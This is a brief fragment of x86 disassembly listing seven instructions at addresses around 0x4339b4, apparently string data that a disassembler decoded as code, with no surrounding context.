  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
